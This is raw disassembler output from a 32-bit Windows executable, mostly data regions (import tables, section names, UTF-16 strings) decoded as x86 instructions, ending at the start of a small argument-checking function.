  4029e4:	push   esp
  4029e5:	sbb    DWORD PTR [eax+0x0],eax
  4029e8:	add    eax,DWORD PTR [eax]
  4029ea:	add    BYTE PTR [eax],al
  4029ec:	add    BYTE PTR [eax],al
  4029ee:	add    BYTE PTR [eax],al
  4029f0:	jl     0x402a0b
  4029f2:	inc    eax
  4029f3:	add    BYTE PTR [eax+0x4019],dl
  4029f9:	add    BYTE PTR [eax],al
  4029fb:	add    BYTE PTR [eax],al
  4029fd:	add    BYTE PTR [eax],al
  4029ff:	add    BYTE PTR [eax+ebx*1],bh
  402a02:	inc    eax
  402a03:	add    BYTE PTR [eax+0x18],dl
  402a06:	inc    eax
  402a07:	add    BYTE PTR [eax+eax*1+0x0],ah
  402a0b:	add    BYTE PTR [eax],al
  402a0d:	add    BYTE PTR [eax],al
  402a0f:	add    BYTE PTR [eax+0x18],bh
  402a12:	inc    eax
  402a13:	add    BYTE PTR [eax+ebx*1+0xc80040],cl
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	add    BYTE PTR [eax],al
  402a1e:	add    BYTE PTR [eax],al
  402a20:	mov    al,0x15
  402a22:	inc    eax
  402a23:	add    al,al
  402a25:	adc    eax,0x40
  402a2a:	add    BYTE PTR [eax],al
  402a2c:	add    BYTE PTR [eax],al
  402a2e:	add    BYTE PTR [eax],al
  402a30:	les    edx,FWORD PTR ds:0x15d40040
  402a36:	inc    eax
  402a37:	add    BYTE PTR [ecx],al
  402a39:	add    BYTE PTR [eax],al
  402a3b:	add    BYTE PTR [eax],al
  402a3d:	add    BYTE PTR [eax],al
  402a3f:	add    BYTE PTR [eax+0x1b],ah
  402a42:	inc    eax
  402a43:	add    BYTE PTR [ebx+ebx*1+0x4000040],cl
  402a4a:	inc    ecx
  402a4b:	adc    BYTE PTR [eax],al
  402a4d:	add    BYTE PTR [eax],al
  402a4f:	add    BYTE PTR [eax-0x1fffbfe5],bh
  402a55:	sbb    eax,DWORD PTR [eax+0x0]
  402a58:	add    BYTE PTR ds:0x2041,al
  402a5e:	add    BYTE PTR [eax],al
  402a60:	or     BYTE PTR [eax+eax*2],bl
  402a63:	add    BYTE PTR [eax+0x1c],al
  402a66:	inc    eax
  402a67:	add    BYTE PTR [eax],al
  402a69:	add    al,0x45
  402a6b:	add    BYTE PTR [eax],al
  402a6d:	add    BYTE PTR [eax],al
  402a6f:	add    BYTE PTR [eax+0x1c],bh
  402a72:	inc    eax
  402a73:	add    al,al
  402a75:	sbb    al,0x40
  402a77:	add    BYTE PTR [eax],al
  402a79:	add    eax,0x45
  402a7e:	add    BYTE PTR [eax],al
  402a80:	or     BYTE PTR ds:0x1d500040,bl
  402a86:	inc    eax
  402a87:	add    BYTE PTR [eax],al
  402a89:	add    eax,0x55
  402a8e:	add    BYTE PTR [eax],al
  402a90:	cwde   
  402a91:	sbb    eax,0x1de00040
  402a96:	inc    eax
  402a97:	add    BYTE PTR [eax],al
  402a99:	add    eax,0x65
  402a9e:	add    BYTE PTR [eax],al
  402aa0:	sub    BYTE PTR [esi],bl
  402aa2:	inc    eax
  402aa3:	add    BYTE PTR [eax+0x1e],bl
  402aa6:	inc    eax
  402aa7:	add    BYTE PTR [eax],al
  402aa9:	add    eax,0x1041
  402aae:	add    BYTE PTR [eax],al
  402ab0:	mov    BYTE PTR [esi],bl
  402ab2:	inc    eax
  402ab3:	add    BYTE PTR [esi+ebx*1+0xb000040],ch
  402aba:	add    BYTE PTR [eax],al
  402abc:	add    BYTE PTR [eax],al
  402abe:	add    BYTE PTR [eax],al
  402ac0:	rcr    BYTE PTR [esi],1
  402ac2:	inc    eax
  402ac3:	add    ah,bh
  402ac5:	push   ds
  402ac6:	inc    eax
  402ac7:	add    BYTE PTR [eax],al
  402ac9:	add    BYTE PTR [ecx],al
  402acb:	add    BYTE PTR [eax],al
  402acd:	add    BYTE PTR [eax],al
  402acf:	add    BYTE PTR [eax],ch
  402ad1:	pop    ds
  402ad2:	inc    eax
  402ad3:	add    BYTE PTR [eax+0x1f],ah
  402ad6:	inc    eax
  402ad7:	add    BYTE PTR [eax],al
  402ad9:	add    DWORD PTR [ecx],eax
  402adb:	add    BYTE PTR [eax],al
  402add:	add    BYTE PTR [eax],al
  402adf:	add    BYTE PTR [eax-0x33ffbfe1],bl
  402ae5:	pop    ds
  402ae6:	inc    eax
	...
  402aef:	add    BYTE PTR [eax],al
  402af1:	and    BYTE PTR [eax+0x0],al
  402af4:	inc    eax
  402af5:	and    BYTE PTR [eax+0x0],al
  402af8:	add    BYTE PTR [ecx],al
  402afa:	add    BYTE PTR [eax],al
  402afc:	add    BYTE PTR [eax],al
  402afe:	add    BYTE PTR [eax],al
  402b00:	and    BYTE PTR [eax],0x40
  402b03:	add    BYTE PTR [eax+eiz*1+0x4000040],ch
  402b0a:	ret    0x20
  402b0d:	add    BYTE PTR [eax],al
  402b0f:	add    al,bl
  402b11:	and    BYTE PTR [eax+0x0],al
  402b14:	add    BYTE PTR [ecx],ah
  402b16:	inc    eax
  402b17:	add    BYTE PTR [eax],al
  402b19:	add    al,0x41
  402b1b:	add    BYTE PTR [eax],al
  402b1d:	add    BYTE PTR [eax],al
  402b1f:	add    BYTE PTR [eax],ch
  402b21:	and    DWORD PTR [eax+0x0],eax
  402b24:	pop    eax
  402b25:	and    DWORD PTR [eax+0x0],eax
  402b28:	add    BYTE PTR ds:0x2141,al
  402b2e:	add    BYTE PTR [eax],al
  402b30:	mov    BYTE PTR [ecx],ah
  402b32:	inc    eax
  402b33:	add    BYTE PTR [ecx+eiz*1+0x4010040],ch
  402b3a:	add    eax,DWORD PTR [eax+0x0]
  402b3d:	add    BYTE PTR [eax],al
  402b3f:	add    al,dl
  402b41:	and    DWORD PTR [eax+0x0],eax
  402b44:	clc    
  402b45:	and    DWORD PTR [eax+0x0],eax
  402b48:	add    BYTE PTR [edx+eax*1],al
  402b4b:	xor    BYTE PTR [eax],al
  402b4d:	add    BYTE PTR [eax],al
  402b4f:	add    BYTE PTR [eax],ah
  402b51:	and    al,BYTE PTR [eax+0x0]
  402b54:	inc    esp
  402b55:	and    al,BYTE PTR [eax+0x0]
  402b58:	add    al,BYTE PTR [ebx+eax*1]
  402b5b:	inc    eax
  402b5c:	add    BYTE PTR [eax],al
  402b5e:	add    BYTE PTR [eax],al
  402b60:	push   0x8c004022
  402b65:	and    al,BYTE PTR [eax+0x0]
  402b68:	add    BYTE PTR ds:0x4002,al
  402b6e:	add    BYTE PTR [eax],al
  402b70:	mov    al,0x22
  402b72:	inc    eax
  402b73:	add    al,bl
  402b75:	and    al,BYTE PTR [eax+0x0]
  402b78:	add    BYTE PTR ds:0x2061,al
  402b7e:	add    BYTE PTR [eax],al
  402b80:	add    BYTE PTR [ebx],ah
  402b82:	inc    eax
  402b83:	add    BYTE PTR [eax],ch
  402b85:	and    eax,DWORD PTR [eax+0x0]
  402b88:	add    BYTE PTR ds:0x2051,al
  402b8e:	add    BYTE PTR [eax],al
  402b90:	push   eax
  402b91:	and    eax,DWORD PTR [eax+0x0]
  402b94:	and    BYTE PTR [ebx],0x40
  402b97:	add    BYTE PTR [eax],al
  402b99:	add    eax,0x2151
  402b9e:	add    BYTE PTR [eax],al
  402ba0:	mov    al,0x23
  402ba2:	inc    eax
  402ba3:	add    ah,ah
  402ba5:	and    eax,DWORD PTR [eax+0x0]
  402ba8:	add    BYTE PTR ds:0x2241,al
  402bae:	add    BYTE PTR [eax],al
  402bb0:	sbb    BYTE PTR [eax+eax*2],ah
  402bb3:	add    BYTE PTR [esp+0x40],dl
  402bb7:	add    BYTE PTR [eax],al
  402bb9:	add    eax,0x2341
  402bbe:	add    BYTE PTR [eax],al
  402bc0:	nop
  402bc1:	and    al,0x40
  402bc3:	add    al,al
  402bc5:	and    al,0x40
  402bc7:	add    BYTE PTR [eax],al
  402bc9:	add    eax,0x4203
  402bce:	add    BYTE PTR [eax],al
  402bd0:	lock and al,0x40
  402bd3:	add    BYTE PTR [eiz*1+0x5000040],ah
  402bda:	push   ecx
  402bdb:	and    al,BYTE PTR [eax]
  402bdd:	add    BYTE PTR [eax],al
  402bdf:	add    BYTE PTR [eax+0x25],bl
  402be2:	inc    eax
  402be3:	add    BYTE PTR [ebp+eiz*1+0x5000040],dl
  402bea:	push   ecx
  402beb:	and    eax,DWORD PTR [eax]
  402bed:	add    BYTE PTR [eax],al
  402bef:	add    al,dl
  402bf1:	and    eax,0x25f40040
  402bf6:	inc    eax
  402bf7:	add    BYTE PTR [eax],al
  402bf9:	add    al,0x2
  402bfb:	and    BYTE PTR [eax],al
  402bfd:	add    BYTE PTR [eax],al
  402bff:	add    BYTE PTR [eax],bl
  402c01:	es inc eax
  402c03:	add    BYTE PTR [eax+0x26],cl
  402c06:	inc    eax
  402c07:	add    BYTE PTR [eax],al
  402c09:	add    eax,0x2002
  402c0e:	add    BYTE PTR [eax],al
  402c10:	js     0x402c38
  402c12:	inc    eax
  402c13:	add    BYTE PTR [esi+eiz*1+0x4030040],dl
  402c1a:	add    eax,DWORD PTR [eax+0x0]
  402c1d:	add    BYTE PTR [eax],al
  402c1f:	add    BYTE PTR [eax-0x27ffbfda],dh
  402c25:	es inc eax
  402c27:	add    BYTE PTR [eax],al
  402c29:	add    eax,0x4003
  402c2e:	add    BYTE PTR [eax],al
  402c30:	add    BYTE PTR [edi],ah
  402c32:	inc    eax
  402c33:	add    BYTE PTR [edi+eiz*1],ah
  402c36:	inc    eax
  402c37:	add    BYTE PTR [eax],al
  402c39:	add    eax,0x3024
  402c3e:	add    BYTE PTR [eax],al
  402c40:	dec    eax
  402c41:	daa    
  402c42:	inc    eax
  402c43:	add    BYTE PTR [eax+0x27],dh
  402c46:	inc    eax
  402c47:	add    BYTE PTR [eax],al
  402c49:	add    al,0x40
  402c4b:	add    BYTE PTR [eax],al
  402c4d:	add    BYTE PTR [eax],al
  402c4f:	add    BYTE PTR [eax-0x33ffbfd9],bl
  402c55:	daa    
  402c56:	inc    eax
  402c57:	add    BYTE PTR [eax],al
  402c59:	add    eax,0x40
  402c5e:	add    BYTE PTR [eax],al
  402c60:	add    BYTE PTR [eax],ch
  402c62:	inc    eax
  402c63:	add    BYTE PTR [eax],bh
  402c65:	sub    BYTE PTR [eax+0x0],al
  402c68:	add    BYTE PTR ds:0x2047,al
  402c6e:	add    BYTE PTR [eax],al
  402c70:	jo     0x402c9a
  402c72:	inc    eax
  402c73:	add    BYTE PTR [eax+0x4028],ch
  402c79:	add    eax,0x2057
  402c7e:	add    BYTE PTR [eax],al
  402c80:	loopne 0x402caa
  402c82:	inc    eax
  402c83:	add    BYTE PTR [eax],bl
  402c85:	sub    DWORD PTR [eax+0x0],eax
  402c88:	add    BYTE PTR ds:0x2067,al
  402c8e:	add    BYTE PTR [eax],al
  402c90:	push   eax
  402c91:	sub    DWORD PTR [eax+0x0],eax
  402c94:	sub    DWORD PTR fs:[eax+0x0],eax
  402c98:	add    DWORD PTR [eax],eax
  402c9a:	add    BYTE PTR [eax+0x0],al
  402ca0:	fcom   DWORD PTR ds:0x15e80040
  402ca6:	inc    eax
	...
  402caf:	add    BYTE PTR [eax],ch
  402cb1:	push   ss
  402cb2:	inc    eax
  402cb3:	add    BYTE PTR [eax+0x16],al
  402cb6:	inc    eax
  402cb7:	add    BYTE PTR [edx],al
  402cb9:	add    BYTE PTR [eax],al
  402cbb:	add    BYTE PTR [eax],al
  402cbd:	add    BYTE PTR [eax],al
  402cbf:	add    BYTE PTR [eax-0x5fffbfea],al
  402cc5:	push   ss
  402cc6:	inc    eax
  402cc7:	add    BYTE PTR [eax+eax*1],al
  402cca:	add    BYTE PTR [eax],al
  402ccc:	add    BYTE PTR [eax],al
  402cce:	add    BYTE PTR [eax],al
  402cd0:	in     al,0x16
  402cd2:	inc    eax
  402cd3:	add    BYTE PTR [eax],cl
  402cd5:	pop    ss
  402cd6:	inc    eax
  402cd7:	add    BYTE PTR [esi],al
  402cd9:	add    BYTE PTR [eax],al
  402cdb:	add    BYTE PTR [eax],al
  402cdd:	add    BYTE PTR [eax],al
  402cdf:	add    BYTE PTR [eax+0x17],cl
  402ce2:	inc    eax
  402ce3:	add    BYTE PTR [eax+0x17],dh
  402ce6:	inc    eax
  402ce7:	add    BYTE PTR [esi],dl
  402ce9:	add    BYTE PTR [eax],al
  402ceb:	add    BYTE PTR [eax],al
  402ced:	add    BYTE PTR [eax],al
  402cef:	add    BYTE PTR [eax-0x17ffbfe9],bh
  402cf5:	pop    ss
  402cf6:	inc    eax
  402cf7:	add    BYTE PTR [eax+eax*1],cl
  402cfa:	add    BYTE PTR [eax],al
  402cfc:	add    BYTE PTR [eax],al
  402cfe:	add    BYTE PTR [eax],al
  402d00:	les    ebx,FWORD PTR [ecx]
  402d02:	inc    eax
  402d03:	add    al,bl
  402d05:	sbb    DWORD PTR [eax+0x0],eax
  402d08:	add    DWORD PTR [eax],eax
  402d0a:	add    BYTE PTR [eax],al
  402d0c:	add    BYTE PTR [eax],al
  402d0e:	add    BYTE PTR [eax],al
  402d10:	or     al,0x1a
  402d12:	inc    eax
  402d13:	add    BYTE PTR [eax],ah
  402d15:	sbb    al,BYTE PTR [eax+0x0]
  402d18:	add    al,BYTE PTR [eax]
  402d1a:	add    BYTE PTR [eax],al
  402d1c:	add    BYTE PTR [eax],al
  402d1e:	add    BYTE PTR [eax],al
  402d20:	pop    eax
  402d21:	sbb    al,BYTE PTR [eax+0x0]
  402d24:	js     0x402d40
  402d26:	inc    eax
  402d27:	add    BYTE PTR [eax+eax*1],al
  402d2a:	add    BYTE PTR [eax],al
  402d2c:	add    BYTE PTR [eax],al
  402d2e:	add    BYTE PTR [eax],al
  402d30:	mov    eax,0xd400401a
  402d35:	sbb    al,BYTE PTR [eax+0x0]
  402d38:	adc    BYTE PTR [eax],al
  402d3a:	add    BYTE PTR [eax],al
  402d3c:	add    BYTE PTR [eax],al
  402d3e:	add    BYTE PTR [eax],al
  402d40:	or     al,0x1b
  402d42:	inc    eax
  402d43:	add    BYTE PTR [eax],ch
  402d45:	sbb    eax,DWORD PTR [eax+0x0]
  402d48:	or     BYTE PTR [eax],al
  402d4a:	add    BYTE PTR [eax],al
  402d4c:	add    BYTE PTR [eax],al
  402d4e:	add    BYTE PTR [eax],al
  402d50:	in     al,0x14
  402d52:	inc    eax
  402d53:	add    al,bh
  402d55:	adc    al,0x40
	...
  402d5f:	add    BYTE PTR [eax],ch
  402d61:	adc    eax,0x15400040
  402d66:	inc    eax
  402d67:	add    BYTE PTR [ecx],al
  402d69:	add    BYTE PTR [eax],al
  402d6b:	add    BYTE PTR [eax],al
  402d6d:	add    BYTE PTR [eax],al
  402d6f:	add    BYTE PTR [ebp+edx*1+0x40],dh
  402d73:	add    BYTE PTR [ebp+edx*1+0x20040],al
  402d7a:	add    BYTE PTR [eax],al
  402d7c:	add    BYTE PTR [eax],al
  402d7e:	add    BYTE PTR [eax],al
  402d80:	push   ebx
  402d81:	add    BYTE PTR [edi+0x0],ch
  402d84:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  402d89:	add    BYTE PTR [ecx+0x0],ah
  402d8c:	jb     0x402d8e
  402d8e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  402d93:	add    BYTE PTR [ecx+0x0],ch
  402d96:	arpl   WORD PTR [eax],ax
  402d98:	jb     0x402d9a
  402d9a:	outs   dx,DWORD PTR ds:[esi]
  402d9b:	add    BYTE PTR [ebx+0x0],dh
  402d9e:	outs   dx,DWORD PTR ds:[esi]
  402d9f:	add    BYTE PTR [esi+0x0],ah
  402da2:	je     0x402da4
  402da4:	pop    esp
  402da5:	add    BYTE PTR [edi+0x0],dl
  402da8:	imul   eax,DWORD PTR [eax],0x64006e
  402dae:	outs   dx,DWORD PTR ds:[esi]
  402daf:	add    BYTE PTR [edi+0x0],dh
  402db2:	jae    0x402db4
  402db4:	and    BYTE PTR [eax],al
  402db6:	dec    esi
  402db7:	add    BYTE PTR [eax+eax*1+0x5c],dl
  402dbb:	add    BYTE PTR [ebx+0x0],al
  402dbe:	jne    0x402dc0
  402dc0:	jb     0x402dc2
  402dc2:	jb     0x402dc4
  402dc4:	add    BYTE PTR gs:[esi+0x0],ch
  402dc8:	je     0x402dca
  402dca:	push   esi
  402dcb:	add    BYTE PTR [ebp+0x0],ah
  402dce:	jb     0x402dd0
  402dd0:	jae    0x402dd2
  402dd2:	imul   eax,DWORD PTR [eax],0x6e006f
  402dd8:	pop    esp
  402dd9:	add    BYTE PTR [eax+0x0],dl
  402ddc:	add    BYTE PTR gs:[edx+0x0],dh
  402de0:	data16 add BYTE PTR [eax+eax*1+0x69],ch
  402de5:	add    BYTE PTR [edx+0x0],ah
  402de8:	pop    esp
  402de9:	add    BYTE PTR [edi+0x0],bl
  402dec:	push   esi
  402ded:	add    BYTE PTR [edx],dh
  402def:	add    BYTE PTR [eax+0x0],dl
  402df2:	jb     0x402df4
  402df4:	outs   dx,DWORD PTR ds:[esi]
  402df5:	add    BYTE PTR [esi+0x0],dh
  402df8:	imul   eax,DWORD PTR [eax],0x650064
  402dfe:	jb     0x402e00
  402e00:	jae    0x402e02
  402e02:	add    BYTE PTR [eax],al
  402e04:	push   eax
  402e05:	add    BYTE PTR [edx+0x0],dh
  402e08:	outs   dx,DWORD PTR ds:[esi]
  402e09:	add    BYTE PTR [esi+0x0],dh
  402e0c:	imul   eax,DWORD PTR [eax],0x650064
  402e12:	jb     0x402e14
  402e14:	dec    esi
  402e15:	add    BYTE PTR [ecx+0x0],ah
  402e18:	ins    DWORD PTR es:[edi],dx
  402e19:	add    BYTE PTR [ebp+0x0],ah
  402e1c:	add    BYTE PTR [eax],al
  402e1e:	add    BYTE PTR [eax],al
  402e20:	or     al,BYTE PTR [eax]
  402e22:	add    BYTE PTR [eax],al
  402e24:	inc    edi
  402e25:	add    BYTE PTR [eax+eax*1+0x6f],ch
  402e29:	add    BYTE PTR [edx+0x0],ah
  402e2c:	popa   
  402e2d:	add    BYTE PTR [eax+eax*1+0x5c],ch
  402e31:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402e35:	add    BYTE PTR [ecx+0x0],al
  402e38:	inc    esp
  402e39:	add    BYTE PTR [eax+0x0],dl
  402e3c:	inc    ebp
  402e3d:	add    BYTE PTR [edx+0x0],dl
  402e40:	inc    esi
  402e41:	add    BYTE PTR [edi+0x0],bl
  402e44:	dec    ebp
  402e45:	add    BYTE PTR [ebp+0x0],dl
  402e48:	push   esp
  402e49:	add    BYTE PTR [ebp+0x0],al
  402e4c:	pop    eax
  402e4d:	add    BYTE PTR [eax],al
  402e4f:	add    BYTE PTR [edx-0x66666667],bl
  402e55:	cdq    
  402e56:	icebp  
  402e57:	aas    
  402e58:	add    BYTE PTR [eax],al
  402e5a:	add    BYTE PTR [eax],al
  402e5c:	add    BYTE PTR [eax],al
  402e5e:	add    BYTE PTR [eax+0x0],al
  402e61:	add    BYTE PTR [eax],al
  402e63:	add    BYTE PTR [eax],bh
  402e65:	cmp    ebx,DWORD PTR [edi+0x55]
  402e6b:	add    BYTE PTR [edx],al
  402e6d:	add    BYTE PTR [eax],al
  402e6f:	add    BYTE PTR ds:0x24000000,ah
  402e75:	das    
  402e76:	add    BYTE PTR [eax],al
  402e78:	and    al,0x23
  402e7a:	add    BYTE PTR [eax],al
  402e7c:	add    BYTE PTR [eax],al
  402e7e:	add    BYTE PTR [eax],al
  402e80:	cmp    BYTE PTR [ebx],bh
  402e82:	lahf   
  402e83:	push   ebp
  402e84:	add    BYTE PTR [eax],al
  402e86:	add    BYTE PTR [eax],al
  402e88:	or     eax,0xc8000000
  402e8d:	add    DWORD PTR [eax],eax
  402e8f:	add    BYTE PTR [eax+0x2f],ah
  402e92:	add    BYTE PTR [eax],al
  402e94:	pusha  
  402e95:	and    eax,DWORD PTR [eax]
	...
  402eb7:	add    BYTE PTR [eax+0x0],ch
	...
  402ef2:	add    BYTE PTR [eax],al
  402ef4:	add    al,0x80
  402ef6:	inc    eax
  402ef7:	add    BYTE PTR [eax],ah
  402ef9:	das    
  402efa:	inc    eax
  402efb:	add    BYTE PTR [ecx],al
  402efd:	add    BYTE PTR [eax],al
  402eff:	add    BYTE PTR [eax+0x4091],ah
  402f05:	add    BYTE PTR [eax],al
  402f07:	add    BYTE PTR [eax+edx*1],bl
  402f0a:	inc    eax
  402f0b:	add    BYTE PTR [edx],cl
  402f0d:	add    BYTE PTR [eax],al
  402f0f:	add    BYTE PTR [eax],al
  402f11:	xor    eax,0x0
	...
  402f1e:	add    BYTE PTR [eax],al
  402f20:	jo     0x402f96
  402f22:	add    BYTE PTR [eax],al
  402f24:	push   edx
  402f25:	push   ebx
  402f26:	inc    esp
  402f27:	push   ebx
  402f28:	cdq    
  402f29:	bound  ebp,QWORD PTR ds:0xe3500c14
  402f2f:	dec    esp
  402f30:	mov    BYTE PTR ds:0xa72ebc45,dl
  402f36:	rcr    DWORD PTR [eax+0x1],0x75
  402f3d:	outs   dx,BYTE PTR ds:[esi]
  402f3e:	ins    BYTE PTR es:[edi],dx
  402f3f:	outs   dx,DWORD PTR ds:[esi]
  402f40:	arpl   WORD PTR fs:[edx+esi*2+0x2e],si
  402f45:	jo     0x402fab
  402f47:	bound  eax,QWORD PTR [eax]
	...
  402f5d:	add    BYTE PTR [eax],al
  402f5f:	add    BYTE PTR [edi+0x43],al
  402f62:	push   esp
  402f63:	dec    esp
  402f64:	add    BYTE PTR [eax],dl
  402f66:	add    BYTE PTR [eax],al
  402f68:	add    al,0x0
  402f6a:	add    BYTE PTR [eax],al
  402f6c:	cs inc ebx
  402f6e:	push   edx
  402f6f:	push   esp
  402f70:	and    al,0x58
  402f72:	inc    ebx
  402f73:	inc    ecx
  402f74:	add    BYTE PTR [eax],al
  402f76:	add    BYTE PTR [eax],al
  402f78:	add    al,0x10
  402f7a:	add    BYTE PTR [eax],al
  402f7c:	add    al,0x0
  402f7e:	add    BYTE PTR [eax],al
  402f80:	cs inc ebx
  402f82:	push   edx
  402f83:	push   esp
  402f84:	and    al,0x58
  402f86:	inc    ebx
  402f87:	inc    ecx
  402f88:	inc    ecx
  402f89:	add    BYTE PTR [eax],al
  402f8b:	add    BYTE PTR [eax],cl
  402f8d:	adc    BYTE PTR [eax],al
  402f8f:	add    BYTE PTR [eax+eax*1],al
  402f92:	add    BYTE PTR [eax],al
  402f94:	cs inc ebx
  402f96:	push   edx
  402f97:	push   esp
  402f98:	and    al,0x58
  402f9a:	inc    ebx
  402f9b:	pop    edx
  402f9c:	add    BYTE PTR [eax],al
  402f9e:	add    BYTE PTR [eax],al
  402fa0:	or     al,0x10
  402fa2:	add    BYTE PTR [eax],al
  402fa4:	add    al,0x0
  402fa6:	add    BYTE PTR [eax],al
  402fa8:	cs inc ebx
  402faa:	push   edx
  402fab:	push   esp
  402fac:	and    al,0x58
  402fae:	dec    ecx
  402faf:	inc    ecx
  402fb0:	add    BYTE PTR [eax],al
  402fb2:	add    BYTE PTR [eax],al
  402fb4:	adc    BYTE PTR [eax],dl
  402fb6:	add    BYTE PTR [eax],al
  402fb8:	add    al,0x0
  402fba:	add    BYTE PTR [eax],al
  402fbc:	cs inc ebx
  402fbe:	push   edx
  402fbf:	push   esp
  402fc0:	and    al,0x58
  402fc2:	dec    ecx
  402fc3:	inc    ecx
  402fc4:	inc    ecx
  402fc5:	add    BYTE PTR [eax],al
  402fc7:	add    BYTE PTR [eax+edx*1],dl
  402fca:	add    BYTE PTR [eax],al
  402fcc:	add    al,0x0
  402fce:	add    BYTE PTR [eax],al
  402fd0:	cs inc ebx
  402fd2:	push   edx
  402fd3:	push   esp
  402fd4:	and    al,0x58
  402fd6:	dec    ecx
  402fd7:	pop    ecx
  402fd8:	add    BYTE PTR [eax],al
  402fda:	add    BYTE PTR [eax],al
  402fdc:	sbb    BYTE PTR [eax],dl
  402fde:	add    BYTE PTR [eax],al
  402fe0:	add    al,0x0
  402fe2:	add    BYTE PTR [eax],al
  402fe4:	cs inc ebx
  402fe6:	push   edx
  402fe7:	push   esp
  402fe8:	and    al,0x58
  402fea:	dec    ecx
  402feb:	pop    edx
  402fec:	add    BYTE PTR [eax],al
  402fee:	add    BYTE PTR [eax],al
  402ff0:	sbb    al,0x10
  402ff2:	add    BYTE PTR [eax],al
  402ff4:	sub    BYTE PTR [eax],al
  402ff6:	add    BYTE PTR [eax],al
  402ff8:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  403000:	add    BYTE PTR [eax],al
  403002:	add    BYTE PTR [eax],al
  403004:	push   eax
  403005:	adc    BYTE PTR [eax],al
  403007:	add    al,dl
  403009:	push   ds
  40300a:	add    BYTE PTR [eax],al
  40300c:	cs jb  0x403073
  40300f:	popa   
  403010:	je     0x403073
  403012:	add    BYTE PTR [eax],al
  403014:	and    BYTE PTR [edi],ch
  403016:	add    BYTE PTR [eax],al
  403018:	add    al,0x0
  40301a:	add    BYTE PTR [eax],al
  40301c:	cs jb  0x403083
  40301f:	popa   
  403020:	je     0x403083
  403022:	and    al,0x73
  403024:	js     0x40308a
  403026:	popa   
  403027:	je     0x40308a
  403029:	add    BYTE PTR [eax],al
  40302b:	add    BYTE PTR [edi+ebp*1],ah
  40302e:	add    BYTE PTR [eax],al
  403030:	add    al,0x2
  403032:	add    BYTE PTR [eax],al
  403034:	cs jb  0x40309b
  403037:	popa   
  403038:	je     0x40309b
  40303a:	and    al,0x7a
  40303c:	jp     0x4030b8
  40303e:	bound  esp,QWORD PTR fs:[edi+0x0]
  403042:	add    BYTE PTR [eax],al
  403044:	xor    BYTE PTR [ecx],dh
  403046:	add    BYTE PTR [eax],al
  403048:	inc    eax
  403049:	inc    esi
  40304a:	add    BYTE PTR [eax],al
  40304c:	cs je  0x4030b4
  40304f:	js     0x4030c5
  403051:	and    al,0x6d
  403053:	outs   dx,BYTE PTR ds:[esi]
  403054:	add    BYTE PTR [eax],al
  403056:	add    BYTE PTR [eax],al
  403058:	jo     0x4030d1
  40305a:	add    BYTE PTR [eax],al
  40305c:	test   BYTE PTR [eax],al
  40305e:	add    BYTE PTR [eax],al
  403060:	cs js  0x4030c7
  403063:	popa   
  403064:	je     0x4030c7
  403066:	and    al,0x78
  403068:	add    BYTE PTR [eax],al
  40306a:	add    BYTE PTR [eax],al
  40306c:	add    BYTE PTR [eax+0x500000],al
  403072:	add    BYTE PTR [eax],al
  403074:	cs fs popa 
  403077:	je     0x4030da
  403079:	add    BYTE PTR [eax],al
  40307b:	add    BYTE PTR [eax-0x80],dl
  40307e:	add    BYTE PTR [eax],al
  403080:	xchg   esp,eax
  403081:	add    eax,DWORD PTR [eax]
  403083:	add    BYTE PTR [esi],ch
  403085:	bound  esi,QWORD PTR [ebx+0x73]
  403088:	add    BYTE PTR [eax],al
  40308a:	add    BYTE PTR [eax],al
  40308c:	add    BYTE PTR [eax+0x1a00000],dl
  403092:	add    BYTE PTR [eax],al
  403094:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  40309d:	add    BYTE PTR [eax],al
  40309f:	add    BYTE PTR [eax+0x4000091],ah
  4030a5:	add    BYTE PTR [eax],al
  4030a7:	add    BYTE PTR [esi],ch
  4030a9:	xor    BYTE PTR [eax],dh
  4030ab:	arpl   WORD PTR [esi+0x67],sp
  4030ae:	add    BYTE PTR [eax],al
  4030b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b1:	xchg   ecx,eax
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	int3   
  4030b5:	add    DWORD PTR [eax],eax
  4030b7:	add    BYTE PTR [esi],ch
  4030b9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  4030c1:	add    BYTE PTR [eax],al
  4030c3:	add    BYTE PTR [eax-0x6d],dh
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	adc    al,0x0
  4030ca:	add    BYTE PTR [eax],al
  4030cc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  4030d5:	add    BYTE PTR [eax],al
  4030d7:	add    BYTE PTR [ebx+edx*4+0x1a00000],al
  4030de:	add    BYTE PTR [eax],al
  4030e0:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x342461
  4030e9:	add    BYTE PTR [eax],al
  4030eb:	add    BYTE PTR [edx*4+0x8a20000],ah
  4030f2:	add    BYTE PTR [eax],al
  4030f4:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  4030fd:	add    BYTE PTR [eax],al
  4030ff:	add    BYTE PTR [eax],al
  403101:	mov    al,ds:0xf00000
  403106:	add    BYTE PTR [eax],al
  403108:	cs jb  0x40317e
  40310b:	jb     0x403170
  40310d:	and    al,0x30
  40310f:	xor    DWORD PTR [eax],eax
  403111:	add    BYTE PTR [eax],al
  403113:	add    al,dh
  403115:	mov    al,ds:0x7100000
  40311a:	add    BYTE PTR [eax],al
  40311c:	cs jb  0x403192
  40311f:	jb     0x403184
  403121:	and    al,0x30
  403123:	xor    al,BYTE PTR [eax]
	...
  403135:	mov    edi,edi
  403137:	push   ebp
  403138:	mov    ebp,esp
  40313a:	mov    eax,DWORD PTR [ebp+0xc]
  40313d:	push   esi
  40313e:	xor    esi,esi
  403140:	test   eax,eax
  403142:	je     0x40314b
  403144:	cmp    eax,0x7fffffff
  403149:	jbe    0x403150
  40314b:	mov    esi,0x80070057
  403150:	test   esi,esi
  403152:	js     0x40318b
  403154:	push   ebx
  403155:	mov    ebx,DWORD PTR [ebp+0x8]
  403158:	xor    esi,esi
  40315a:	push   edi
  40315b:	lea    edi,[eax-0x1]
  40315e:	lea    eax,[ebp+0x14]
  403161:	push   eax
  403162:	push   DWORD PTR [ebp+0x10]
  403165:	push   edi
  403166:	push   ebx
  403167:	call   DWORD PTR ds:0x409188
